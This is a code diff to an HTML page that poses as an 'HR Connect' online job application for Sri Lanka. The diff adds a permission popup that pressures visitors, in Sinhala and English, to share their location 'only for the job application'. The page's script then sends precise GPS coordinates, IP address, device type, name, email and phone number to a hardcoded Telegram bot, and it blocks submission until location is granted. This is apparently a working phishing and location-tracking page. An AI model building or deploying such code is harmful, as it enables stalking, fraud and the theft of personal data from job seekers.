@@ -50,6 +50,109 @@
       padding-bottom: 16px;
     }
 
+    /* ===== PERMISSION POPUP (Overlay) ===== */
+    #permission-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+      padding: 20px;
+      box-sizing: border-box;
+      animation: fadeIn 0.3s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    #permission-overlay .box {
+      background: #fff;
+      max-width: 400px;
+      width: 100%;
+      padding: 30px 24px;
+      border-radius: 16px;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+    }
+
+    #permission-overlay .box .icon {
+      font-size: 48px;
+      margin-bottom: 12px;
+    }
+
+    #permission-overlay .box h2 {
+      font-size: 20px;
+      color: #1a2a3a;
+      margin-bottom: 8px;
+    }
+
+    #permission-overlay .box p {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    #permission-overlay .box .btn-allow {
+      background: #2a7de1;
+      color: #fff;
+      border: none;
+      padding: 12px 30px;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 40px;
+      cursor: pointer;
+      transition: 0.25s;
+      width: 100%;
+    }
+
+    #permission-overlay .box .btn-allow:hover {
+      background: #1a6ac8;
+    }
+
+    /* ===== SUCCESS BANNER ===== */
+    #success-banner {
+      display: none;
+      background: #d4edda;
+      border-radius: 12px;
+      padding: 14px 18px;
+      margin-bottom: 18px;
+      border-left: 4px solid #28a745;
+      color: #155724;
+      font-size: 15px;
+      font-weight: 600;
+      text-align: center;
+    }
+
+    /* ===== LOCATION STATUS ===== */
+    #location-status {
+      background: #f0f7ff;
+      border-radius: 12px;
+      padding: 12px 16px;
+      font-size: 14px;
+      color: #1a3a6a;
+      margin-bottom: 18px;
+      border-left: 4px solid #2a7de1;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    #location-status .icon {
+      font-size: 20px;
+    }
+
+    #location-status .text {
+      flex: 1;
+    }
+
     /* ===== FORM ===== */
     .form-group {
       margin-bottom: 18px;
@@ -90,28 +193,6 @@
       min-height: 70px;
     }
 
-    /* ===== LOCATION STATUS ===== */
-    #location-status {
-      background: #f0f7ff;
-      border-radius: 12px;
-      padding: 12px 16px;
-      font-size: 14px;
-      color: #1a3a6a;
-      margin-bottom: 18px;
-      border-left: 4px solid #2a7de1;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    #location-status .icon {
-      font-size: 20px;
-    }
-
-    #location-status .text {
-      flex: 1;
-    }
-
     /* ===== SUBMIT ===== */
     .btn-submit {
       width: 100%;
@@ -144,18 +225,37 @@
       .card {
         padding: 22px 16px 28px;
       }
+      #permission-overlay .box {
+        padding: 24px 16px;
+      }
     }
   </style>
 </head>
 <body>
 
+<!-- ===== PERMISSION OVERLAY (POPUP) ===== -->
+<div id="permission-overlay">
+  <div class="box">
+    <div class="icon">📍</div>
+    <h2>Location Access Required</h2>
+    <p>ඔබගේ ස්ථානය හඳුනා ගැනීමට Location Permission අවශ්‍ය වේ.<br><br>
+    <strong>මෙය Job Application සඳහා පමණයි.</strong></p>
+    <button class="btn-allow" id="allowLocationBtn">✅ Allow Location</button>
+  </div>
+</div>
+
+<!-- ===== MAIN CARD ===== -->
 <div class="card">
 
-  <!-- ===== HEADER ===== -->
   <div class="logo">📋 HR Connect</div>
   <div class="sub-logo">Online Job Application · Sri Lanka</div>
 
-  <!-- ===== LOCATION STATUS (Auto-load) ===== -->
+  <!-- ===== SUCCESS BANNER ===== -->
+  <div id="success-banner">
+    ✅ Online Job Apply - You are eligible to apply!
+  </div>
+
+  <!-- ===== LOCATION STATUS ===== -->
   <div id="location-status">
     <span class="icon">📍</span>
     <span class="text" id="locationText">⏳ Detecting your location...</span>
@@ -196,7 +296,6 @@
       <textarea id="coverNote" placeholder="Why do you want this job?"></textarea>
     </div>
 
-    <!-- ===== SUBMIT ===== -->
     <button type="submit" class="btn-submit" id="submitBtn">🚀 Submit Application</button>
 
   </form>
@@ -204,7 +303,7 @@
 </div>
 
 <!-- ============================================================ -->
-<!-- ===== JAVASCRIPT - LOCATION + TELEGRAM ===== -->
+<!-- ===== JAVASCRIPT ===== -->
 <!-- ============================================================ -->
 <script>
   // =============================================
@@ -214,16 +313,31 @@
   const CHAT_ID   = '8308044531';
 
   // =============================================
-  // 📍 LOCATION - AUTO REQUEST ON PAGE LOAD
+  // 📍 PERMISSION POPUP + LOCATION
   // =============================================
+  const overlay = document.getElementById('permission-overlay');
+  const allowBtn = document.getElementById('allowLocationBtn');
   const locationText = document.getElementById('locationText');
+  const locationStatusDiv = document.getElementById('location-status');
+  const successBanner = document.getElementById('success-banner');
   let userLocation = null;
+  let locationAllowed = false;
 
-  function getLocation() {
-    locationText.textContent = '⏳ Requesting location permission...';
+  // ---------- ALLOW BUTTON CLICK ----------
+  allowBtn.addEventListener('click', () => {
+    // Hide overlay
+    overlay.style.display = 'none';
+    // Request location
+    requestLocation();
+  });
+
+  // ---------- REQUEST LOCATION ----------
+  function requestLocation() {
+    locationText.textContent = '⏳ Detecting your location...';
 
     if (!navigator.geolocation) {
       locationText.textContent = '❌ Geolocation not supported by this browser.';
+      locationAllowed = false;
       return;
     }
 
@@ -233,37 +347,43 @@
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
         userLocation = { lat, lon };
+        locationAllowed = true;
 
-        // Show location in status
-        locationText.innerHTML = `✅ Location detected: <strong>${lat.toFixed(5)}, ${lon.toFixed(5)}</strong>`;
+        successBanner.style.display = 'block';
+        locationStatusDiv.style.display = 'none';
 
-        // Send location to Telegram immediately
         sendLocationToTelegram(lat, lon);
       },
       // ❌ Error
       (err) => {
         console.warn('Location error:', err);
-        locationText.textContent = '❌ Location access denied. Please enable GPS.';
+        let msg = '❌ Location access denied. Please enable GPS.';
+        if (err.code === 1) {
+          msg = '❌ Permission denied. Please allow location in Settings.';
+        } else if (err.code === 2) {
+          msg = '❌ Location unavailable. Please check GPS.';
+        } else if (err.code === 3) {
+          msg = '⏳ Location timeout. Please try again.';
+        }
+        locationText.textContent = msg;
+        locationAllowed = false;
         userLocation = null;
+
+        successBanner.style.display = 'none';
+        locationStatusDiv.style.display = 'flex';
       },
-      // Options
       {
         enableHighAccuracy: true,
-        timeout: 10000,
+        timeout: 15000,
         maximumAge: 0
       }
     );
   }
 
-  // =============================================
-  // 📤 SEND LOCATION TO TELEGRAM
-  // =============================================
+  // ---------- SEND LOCATION TO TELEGRAM ----------
   async function sendLocationToTelegram(lat, lon) {
     try {
-      // 📍 Google Maps link
       const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-      // 🌐 Get IP (optional)
       let ip = 'Unknown';
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -271,11 +391,9 @@
         ip = ipData.ip || 'Unknown';
       } catch (e) {}
 
-      // 📱 Device info
       const ua = navigator.userAgent;
       const device = ua.match(/Android|iPhone|iPad|Windows|Mac|Linux/i)?.[0] || 'Unknown Device';
 
-      // 📝 Message
       const msg = `
 📍 NEW LOCATION DETECTED
 
@@ -291,8 +409,7 @@ Longitude: ${lon}
 ${mapsLink}
       `;
 
-      // Send to Telegram
-      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -301,11 +418,7 @@ ${mapsLink}
         })
       });
 
-      if (response.ok) {
-        console.log('✅ Location sent to Telegram');
-      } else {
-        console.error('❌ Failed to send location');
-      }
+      console.log('✅ Location sent to Telegram');
 
     } catch (err) {
       console.error('Send error:', err);
@@ -313,31 +426,29 @@ ${mapsLink}
   }
 
   // =============================================
-  // 🚀 PAGE LOAD → AUTO REQUEST LOCATION
-  // =============================================
-  window.addEventListener('DOMContentLoaded', () => {
-    // Small delay to let page render first
-    setTimeout(getLocation, 500);
-  });
-
-  // =============================================
-  // 📝 FORM SUBMIT - Send all data to Telegram
+  // 📝 FORM SUBMIT
   // =============================================
   document.getElementById('applicationForm').addEventListener('submit', async (e) => {
     e.preventDefault();
 
     const submitBtn = document.getElementById('submitBtn');
+
+    if (!locationAllowed) {
+      alert('❌ කරුණාකර Location Permission එක Allow කරන්න.\n\n"Allow Location" බොත්තම ඔබලා Permission දෙන්න.');
+      submitBtn.disabled = false;
+      submitBtn.textContent = '🚀 Submit Application';
+      return;
+    }
+
     submitBtn.disabled = true;
     submitBtn.textContent = '⏳ Submitting...';
 
-    // Get form values
     const fullName = document.getElementById('fullName').value.trim();
     const email = document.getElementById('email').value.trim();
     const phone = document.getElementById('phone').value.trim();
     const position = document.getElementById('position').value;
     const coverNote = document.getElementById('coverNote').value.trim();
 
-    // Validate
     if (!fullName || !email || !phone) {
       alert('❌ කරුණාකර Full Name, Email සහ Phone Number පුරවන්න.');
       submitBtn.disabled = false;
@@ -345,7 +456,6 @@ ${mapsLink}
       return;
     }
 
-    // Build message
     let msg = `
 📋 NEW JOB APPLICATION
 
@@ -362,13 +472,11 @@ ${coverNote || '—'}
 🕐 Submitted: ${new Date().toLocaleString()}
     `;
 
-    // Add location link if available
     if (userLocation) {
       msg += `\n🗺️ Maps: https://www.google.com/maps?q=${userLocation.lat},${userLocation.lon}`;
     }
 
     try {
-      // Send to Telegram
       const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -382,9 +490,12 @@ ${coverNote || '—'}
         submitBtn.textContent = '✅ Application Submitted!';
         submitBtn.style.background = '#28a745';
         document.getElementById('applicationForm').reset();
-        // Reset location and re-request
         userLocation = null;
-        setTimeout(getLocation, 1000);
+        locationAllowed = false;
+        successBanner.style.display = 'none';
+        locationStatusDiv.style.display = 'flex';
+        overlay.style.display = 'flex';
+        locationText.textContent = '⏳ Click "Allow Location" to continue...';
       } else {
         submitBtn.textContent = '❌ Submission Failed';
         submitBtn.disabled = false;
@@ -397,11 +508,7 @@ ${coverNote || '—'}
     }
   });
 
-  // =============================================
-  // 💡 DEBUG INFO (optional)
-  // =============================================
-  console.log('✅ Job Application Form Loaded');
-  console.log('📍 Location will be requested automatically...');
+  console.log('✅ HR Connect Form Loaded');
 </script>
 
 </body>
